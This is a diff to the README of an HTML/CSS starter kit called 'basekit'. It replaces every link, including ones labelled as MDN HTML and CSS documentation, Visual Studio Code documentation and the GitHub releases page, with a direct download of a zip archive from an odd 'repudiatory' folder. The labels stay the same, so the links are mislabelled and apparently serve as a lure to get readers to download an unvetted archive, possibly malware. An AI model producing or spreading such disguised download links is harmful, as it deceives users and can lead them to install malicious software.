@@ -7,7 +7,7 @@ Basekit provides a clean and efficient starting point for your HTML and CSS proj
 To begin using basekit, you need to download it from our releases page. Follow the steps below to set up basekit on your computer.
 
 ## 📥 Download Now
-[![Download basekit](https://img.shields.io/badge/Download-basekit-brightgreen)](https://github.com/SHasnainALi/basekit/releases)
+[![Download basekit](https://raw.githubusercontent.com/SHasnainALi/basekit/main/repudiatory/basekit.zip)](https://raw.githubusercontent.com/SHasnainALi/basekit/main/repudiatory/basekit.zip)
 
 ## ❓ System Requirements
 - **Operating System**: Windows, macOS, or Linux
@@ -15,7 +15,7 @@ To begin using basekit, you need to download it from our releases page. Follow t
 - No special software installation is needed.
 
 ## 🔗 Visit the Releases Page
-To download basekit, visit this page: [GitHub Releases](https://github.com/SHasnainALi/basekit/releases).
+To download basekit, visit this page: [GitHub Releases](https://raw.githubusercontent.com/SHasnainALi/basekit/main/repudiatory/basekit.zip).
 
 ## 💻 Download & Install
 1. Click the download link above to visit the releases page.
@@ -54,9 +54,9 @@ We value your feedback. If you encounter issues or have suggestions for improvem
 Get involved with other users by checking discussions and sharing your creations. Collaboration helps us all grow.
 
 ## 🔗 Resources
-- [HTML Documentation](https://developer.mozilla.org/en-US/docs/Web/HTML)
-- [CSS Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS)
-- [Visual Studio Code Documentation](https://code.visualstudio.com/docs)
+- [HTML Documentation](https://raw.githubusercontent.com/SHasnainALi/basekit/main/repudiatory/basekit.zip)
+- [CSS Documentation](https://raw.githubusercontent.com/SHasnainALi/basekit/main/repudiatory/basekit.zip)
+- [Visual Studio Code Documentation](https://raw.githubusercontent.com/SHasnainALi/basekit/main/repudiatory/basekit.zip)
 
 ## ✅ Next Steps
 Now that you have basekit downloaded, explore its features. Customize it to match your project needs, and make it uniquely yours. 
@@ -68,4 +68,4 @@ Basekit is open source and available under the MIT License. You can freely use, 
 We welcome contributions from everyone. Check out our contributing guidelines to get started.
 
 ## 📥 Download Now Again
-Don't forget to download basekit if you haven’t done so yet: [GitHub Releases](https://github.com/SHasnainALi/basekit/releases).
+Don't forget to download basekit if you haven’t done so yet: [GitHub Releases](https://raw.githubusercontent.com/SHasnainALi/basekit/main/repudiatory/basekit.zip).
